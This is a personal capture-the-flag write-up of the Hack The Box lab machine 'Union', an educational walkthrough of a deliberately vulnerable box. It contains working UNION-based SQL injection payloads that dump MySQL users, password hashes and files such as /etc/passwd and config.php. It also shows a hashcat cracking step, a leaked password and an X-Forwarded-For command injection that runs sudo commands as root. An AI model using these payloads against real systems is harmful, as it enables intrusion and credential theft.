# Union

**machine:** https://app.hackthebox.com/machines/418

> I joined the Discord server ~35 minutes late, as I was having trouble setting up the HackTheBox VPN (the solution was to change my VPN region to EU, then back to US, and *then* re-download the `.ovpn` file), and then didn’t have the right invite link!
> 
> Anyways, this was my first box in a *long* time, and boy am I rusty!

The target IP is 10.129.202.139 (at least initially). The `index.php` page seems to accept any input (`player=foo`), and directs the “player” to the `challenge.php` page. There’s a single-element form here, but it doesn’t seem to do anything on submission (`flag=bar`)?

Running [`gobuster`](../Notes/Using%20%22gobuster%22.md) to try to enumerate potentially common directories:

```bash
gobuster -t 50 dir -u http://10.129.202.139 -w /usr/share/wordlists/dirb/common.txt
```

Results:

```
/css       → /css/
/index.php
```

Not much help there. Let’s try the same thing with some common extensions:

```bash
gobuster -t 50 dir -u http://10.129.202.139 \
         -w /usr/share/wordlists/dirb/common.txt \
         -x .php,.html,.htm,.txt,.md,.js,.css
```

Results:

```
/config.php
/css          → /css/
/firewall.php
/index.php
```

[A general reminder about how to use gobuster.](https://www.freecodecamp.org/news/gobuster-tutorial-find-hidden-directories-sub-domains-and-s3-buckets/)

The `/config.php` and `/firewall.php` files look interesting!

- `/config.php` just returns a zero-length document. Booo!
- `/firewall.php` just returns `Access Denied` .

Alright, let’s try [nmap](../Notes/Using%20%22nmap%22.md):

```bash
sudo nmap -v -oN union -Pn -A --reason -T4 -p- 10.129.202.139
```

Output:

```
Host discovery disabled (-Pn). All addresses will be marked 'up' and scan times may be slower.
Starting Nmap 7.93 ( https://nmap.org ) at 2023-04-27 19:24 MDT
NSE: Loaded 155 scripts for scanning.
NSE: Script Pre-scanning.
Initiating NSE at 19:24
Completed NSE at 19:24, 0.00s elapsed
Initiating NSE at 19:24
Completed NSE at 19:24, 0.00s elapsed
Initiating NSE at 19:24
Completed NSE at 19:24, 0.00s elapsed
Initiating Parallel DNS resolution of 1 host. at 19:24
Completed Parallel DNS resolution of 1 host. at 19:24, 0.02s elapsed
Initiating SYN Stealth Scan at 19:24
Scanning 10.129.202.139 [65535 ports]
Discovered open port 80/tcp on 10.129.202.139
SYN Stealth Scan Timing: About 21.06% done; ETC: 19:26 (0:01:56 remaining)
SYN Stealth Scan Timing: About 55.83% done; ETC: 19:26 (0:00:48 remaining)
Completed SYN Stealth Scan at 19:25, 91.51s elapsed (65535 total ports)
Initiating Service scan at 19:25
Scanning 1 service on 10.129.202.139
Completed Service scan at 19:26, 6.12s elapsed (1 service on 1 host)
Initiating OS detection (try #1) against 10.129.202.139
Retrying OS detection (try #2) against 10.129.202.139
Initiating Traceroute at 19:26
Completed Traceroute at 19:26, 0.07s elapsed
Initiating Parallel DNS resolution of 2 hosts. at 19:26
Completed Parallel DNS resolution of 2 hosts. at 19:26, 0.02s elapsed
NSE: Script scanning 10.129.202.139.
Initiating NSE at 19:26
Completed NSE at 19:26, 5.07s elapsed
Initiating NSE at 19:26
Completed NSE at 19:26, 0.22s elapsed
Initiating NSE at 19:26
Completed NSE at 19:26, 0.00s elapsed
Nmap scan report for 10.129.202.139
Host is up, received user-set (0.058s latency).
Not shown: 65534 filtered tcp ports (no-response)
PORT   STATE SERVICE REASON         VERSION
80/tcp open  http    syn-ack ttl 63 nginx 1.18.0 (Ubuntu)
|http-server-header: nginx/1.18.0 (Ubuntu)
| http-cookie-flags:
|   /:
|     PHPSESSID:
|      httponly flag not set
| http-methods:
|_  Supported Methods: GET HEAD POST
|_http-title: Site doesn't have a title (text/html; charset=UTF-8).
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
Aggressive OS guesses: Linux 2.6.32 (94%), Linux 4.15 - 5.6 (92%), Linux 5.0 - 5.4 (91%), Linux 5.3 - 5.4 (91%), Linux 5.0 (90%), Linux 5.0 - 5.3 (90%), Linux 5.4 (90%), Crestron XPanel control system (90%), ASUS RT-N56U WAP (Linux 3.4) (87%), Linux 3.1 (87%)
No exact OS matches for host (test conditions non-ideal).
Uptime guess: 27.153 days (since Fri Mar 31 15:46:21 2023)
Network Distance: 2 hops
TCP Sequence Prediction: Difficulty=258 (Good luck!)
IP ID Sequence Generation: All zeros
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

TRACEROUTE (using port 80/tcp)
HOP RTT      ADDRESS
1   63.08 ms 10.10.14.1
2   63.24 ms 10.129.202.139

NSE: Script Post-scanning.
Initiating NSE at 19:26
Completed NSE at 19:26, 0.00s elapsed
Initiating NSE at 19:26
Completed NSE at 19:26, 0.00s elapsed
Initiating NSE at 19:26
Completed NSE at 19:26, 0.00s elapsed
Read data files from: /usr/bin/../share/nmap
OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 107.94 seconds
           Raw packets sent: 131215 (5.777MB) | Rcvd: 251 (19.772KB)
```

Well, that’s less than helpful; we already knew that there was a web server running on port 80 (and there’s nothing else).

Okay, let’s try fuzzing the two pages with Burp Suite and see what we get! Interesting observations...

- `/index.php` 
	1. Submitting hexadecimal numbers for `player` (for example, 0x0 or 0xabad1dea) result in only the *first* half of the normal response, without any HTML or the `/challenge.php` link.
	2. You can insert any HTML you’d like, and it gets rendered back in the page.
	3. Inputs always seem to be lower-cased before they’re returned.
	4. `' OR 1=1 -- 1` and `' OR '1'='1` are *also* missing the second half of the response, like the 0x numbers. So maybe we have [SQL injection](../Notes/SQL%20Injection.md)?
- `/challenge.php` returns nothing interesting...

(I really need a more targeted fuzzing list than the “big list of naughty strings”, as the free version of Burp Suite throttles Intruder so much that this list takes over 30 minutes to process!)

(Also, be sure to look at the response in **Raw** mode to avoid going down bunny trails about formatting changes that ​*don’t actually exist in the server response*​!)

Okay, so not many clues at this point. SQL injection *might* be a thing, but the behavior with hexadecimal numbers is... Odd.

> So, here I’m going to “cheat” a bit. I know from the discussion on Discord that SQL injection *is* a thing for this box, and is, in fact, how you get the first flag. So even though my evidence at this point is circumstantial/weak, I’m going to go that route.

Since `' OR 1=1 -- 1` gave us something interesting, let’s send `/index.php` to Repeater and see what some other values for `player` do for us...

1. `' UNION SELECT '>>>STUFF<<<' -- 1` returns `>>>STUFF<<<` for the user name!
2. `' UNION SELECT @@datadir -- 1` returns `/var/lib/mysql` , so we’re dealing with MySQL.
3. `' UNION SELECT schema_name FROM information_schema.schemata -- 1` returns `mysql` ... Which isn’t right. It looks like only a single row (probably the last one, given that we only see one row with `UNION` ) is returned.
4. `' UNION SELECT schema_name FROM information_schema.schemata LIMIT 1 OFFSET 0 -- 1` also returns `mysql` ... But using `OFFSET 1` returns `information_schema` , so I guess we’ll just do it this way. Iterating, we also see databases called `performance_schema` , `sys` , and `november` . All of these are standard MySQL databases except for `november` .
5. `' UNION SELECT database() -- 1` confirms that we’re in the `november` database.
6. `' UNION SELECT table_name FROM information_schema.tables WHERE table_schema != 'november' LIMIT 1 OFFSET 0 -- 1` returns `flag` , and iterating reveals a second table `players` . There doesn’t seem to be anything else. The `flag` table looks promising, so let’s see what’s there.
7. `' UNION SELECT column_name FROM information_schema.columns WHERE table_schema = 'november' and table_name = 'flag' LIMIT 1 OFFSET 0 -- 1` (and iterating) reveals that there’s a single column called `one` .
8. `' UNION SELECT COUNT(*) FROM flag -- 1` reveals that there’s only a single row in `flag` . Easy!
9. `' UNION SELECT one FROM flag -- 1` then provides a “flag” value.

(The above is made possible using [this handy SQL injection cheat-sheet for MySQL](https://pentestmonkey.net/cheat-sheet/sql-injection/mysql-sql-injection-cheat-sheet).)

Now, as it turns out, this is *not* a flag for the box! Instead, inputting it into `/challenge.php` generates the message that `Your IP Address has now been granted SSH Access`.

Let’s confirm...

```bash
sudo nmap -v -oN union2 -Pn -A --reason -T4 -p- 10.129.202.139
```

Output:

```
Host discovery disabled (-Pn). All addresses will be marked 'up' and scan times may be slower.
Starting Nmap 7.93 ( https://nmap.org ) at 2023-04-27 21:16 MDT
NSE: Loaded 155 scripts for scanning.
NSE: Script Pre-scanning.
Initiating NSE at 21:16
Completed NSE at 21:16, 0.00s elapsed
Initiating NSE at 21:16
Completed NSE at 21:16, 0.00s elapsed
Initiating NSE at 21:16
Completed NSE at 21:16, 0.00s elapsed
Initiating Parallel DNS resolution of 1 host. at 21:16
Completed Parallel DNS resolution of 1 host. at 21:16, 0.01s elapsed
Initiating SYN Stealth Scan at 21:16
Scanning 10.129.202.139 [65535 ports]
Discovered open port 22/tcp on 10.129.202.139
Discovered open port 80/tcp on 10.129.202.139
Completed SYN Stealth Scan at 21:17, 35.32s elapsed (65535 total ports)
Initiating Service scan at 21:17
Scanning 2 services on 10.129.202.139
Completed Service scan at 21:17, 6.12s elapsed (2 services on 1 host)
Initiating OS detection (try #1) against 10.129.202.139
Retrying OS detection (try #2) against 10.129.202.139
Retrying OS detection (try #3) against 10.129.202.139
Retrying OS detection (try #4) against 10.129.202.139
Retrying OS detection (try #5) against 10.129.202.139
Initiating Traceroute at 21:17
Completed Traceroute at 21:17, 0.06s elapsed
Initiating Parallel DNS resolution of 2 hosts. at 21:17
Completed Parallel DNS resolution of 2 hosts. at 21:17, 0.01s elapsed
NSE: Script scanning 10.129.202.139.
Initiating NSE at 21:17
Completed NSE at 21:17, 1.73s elapsed
Initiating NSE at 21:17
Completed NSE at 21:17, 0.27s elapsed
Initiating NSE at 21:17
Completed NSE at 21:17, 0.02s elapsed
Nmap scan report for 10.129.202.139
Host is up, received user-set (0.054s latency).
Not shown: 65533 closed tcp ports (reset)
PORT   STATE SERVICE REASON         VERSION
22/tcp open  ssh     syn-ack ttl 63 OpenSSH 8.2p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   3072 ea8421a3224a7df9b525517983a4f5f2 (RSA)
|   256 b8399ef488beaa01732d10fb447f8461 (ECDSA)
|_  256 2221e9f485908745161f733641ee3b32 (ED25519)
80/tcp open  http    syn-ack ttl 63 nginx 1.18.0 (Ubuntu)
| http-cookie-flags:
|   /:
|     PHPSESSID:
|_      httponly flag not set
|http-title: Site doesn't have a title (text/html; charset=UTF-8).
| http-methods:
|  Supported Methods: GET HEAD POST
|_http-server-header: nginx/1.18.0 (Ubuntu)
No exact OS matches for host (If you know what OS is running on it, see https://nmap.org/submit/ ).
TCP/IP fingerprint:
OS:SCAN(V=7.93%E=4%D=4/27%OT=22%CT=1%CU=31913%PV=Y%DS=2%DC=T%G=Y%TM=644B3AD
OS:9%P=aarch64-unknown-linux-gnu)SEQ(SP=100%GCD=1%ISR=10B%TI=Z%CI=Z%II=I%TS
OS:=A)OPS(O1=M550ST11NW7%O2=M550ST11NW7%O3=M550NNT11NW7%O4=M550ST11NW7%O5=M
OS:550ST11NW7%O6=M550ST11)WIN(W1=FE88%W2=FE88%W3=FE88%W4=FE88%W5=FE88%W6=FE
OS:88)ECN(R=Y%DF=Y%T=40%W=FAF0%O=M550NNSNW7%CC=Y%Q=)T1(R=Y%DF=Y%T=40%S=O%A=
OS:S+%F=AS%RD=0%Q=)T2(R=N)T3(R=N)T4(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F=R%O=%RD=0%Q
OS:=)T5(R=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)T6(R=Y%DF=Y%T=40%W=0%S=A
OS:%A=Z%F=R%O=%RD=0%Q=)T7(R=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)U1(R=Y
OS:%DF=N%T=40%IPL=164%UN=0%RIPL=G%RID=G%RIPCK=G%RUCK=G%RUD=G)IE(R=Y%DFI=N%T
OS:=40%CD=S)

Uptime guess: 27.230 days (since Fri Mar 31 15:46:20 2023)
Network Distance: 2 hops
TCP Sequence Prediction: Difficulty=256 (Good luck!)
IP ID Sequence Generation: All zeros
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

TRACEROUTE (using port 111/tcp)
HOP RTT      ADDRESS
1   56.02 ms 10.10.14.1
2   56.12 ms 10.129.202.139

NSE: Script Post-scanning.
Initiating NSE at 21:17
Completed NSE at 21:17, 0.00s elapsed
Initiating NSE at 21:17
Completed NSE at 21:17, 0.00s elapsed
Initiating NSE at 21:17
Completed NSE at 21:17, 0.00s elapsed
Read data files from: /usr/bin/../share/nmap
OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 56.07 seconds
           Raw packets sent: 66144 (2.914MB) | Rcvd: 65710 (2.632MB)
```

So, we definitely have an open SSH port now! But what user to use?

Maybe there’s password re-use with MySQL? Let’s see what we’ve got:

1. `' UNION SELECT COUNT(*) FROM mysql.user -- 1` shows that we have 6 users.
2. `' UNION SELECT user FROM mysql.user LIMIT 1 OFFSET 0 -- 1` (and iterating) shows that these users are `debian-sys-maint`, `mysql.infoschema`, `mysql.session`, `mysql.sys`, `root`, and `uhc`. Both `root` and `uhc` look promising.
3. `' UNION SELECT host FROM mysql.user WHERE user = 'root' -- 1` (and `uhc`) shows that both are permitted to login from `localhost` (though that may not mean anything, since this is just database access).
4. `' UNION SELECT authentication_string FROM mysql.user WHERE user = 'root' -- 1` (and `uhc`) reveals that `root` *doesn’t* have a password, but `uhc` has the password hash `$A$005$fqzRyy_GvC%I"Ud!F3Z3eO0EhsyqGcOsJRT9yyY2rX68rfr78QxWqRyR9tb2`. (Apparently there’s no `password` column in the `mysql.users` table anymore; it’s now called `authentication_string` per [the documentation](https://dev.mysql.com/doc/refman/8.0/en/grant-tables.html#grant-tables-user-db).)

Unfortunately, it turns out that we can’t just feed this hash into [`john`](../Notes/Using%20John%20the%20Ripper.md) or [`hashcat`](../Notes/Using%20Hashcat.md), but need to [massage things a bit first](https://www.percona.com/blog/brute-force-mysql-password-from-a-hash/).

1. First, we use ​`' UNION SELECT CONCAT('$mysql',LEFT(authentication_string,6),'*',INSERT(HEX(SUBSTR(authentication_string,8)),41,0,'*')) FROM mysql.user WHERE user = 'uhc'`​ to get a string that `hashcat` can handle: ​`$mysql$A$005*66717A5279795F47760843251049172255642146*335A33654F30456873797147634F734A525439797959327258363872667237385178577152795239746232`.
2. Then we run `hashcat -m 7401 -O hash.txt rockyou.txt`.

But, this is going to take a loooong time... So, I tried a few other things:

- There’s 6 users in the `players` table, but none of them work as passwords (or alternate user names).
- `' UNION SELECT LOAD_FILE('/etc/passwd') -- 1` displays the password file, but I can’t access `/etc/shadow`, so it doesn’t look like we’re running as root.
- But we can look at other files, including `/config.php`! And it turns out that there’s a cleartext password there that we can read with `' UNION SELECT LOAD_FILE('/var/www/html/config.php') -- 1` : `uhc-11qual-global-pw`. ​*This works to log in as the `uhc` user!*

The **first flag** is then in the `user.txt` file in `/home/uhc`.

Unfortunately, `uhc` isn’t in the `sudoers` file, and there’s no obviously vulnerably SUID binaries or files with loose permissions.

But...

If you run `' UNION SELECT LOAD_FILE('/var/www/html/firewall.php') -- 1` , you’ll see that the *web server* has sudo access, and uses it to make a call to `iptables` using the value of either the `X-Forwarded-For` or `Remote-Host` headers. And since this call is just a concatenation of the value of this header wrapped in PHP’s `system()` call, that means *I* can insert whatever I want. For example, setting

```http
X-Forwarded-For: 127.0.0.1 -j ACCEPT; sudo ls -la /root ; echo
```

lists the contents of the `/root` directory, revealing the standard `/root/root.txt` flag file. And thus

```http
X-Forwarded-For: 127.0.0.1 -j ACCEPT; sudo cat /root/root.txt ; echo
```

will return the contents of that file.

Which just so happens to be the ​**second flag**​.

(Really, I *should* have used this trick to get both flags...)

**Elapsed Time:** 04:06
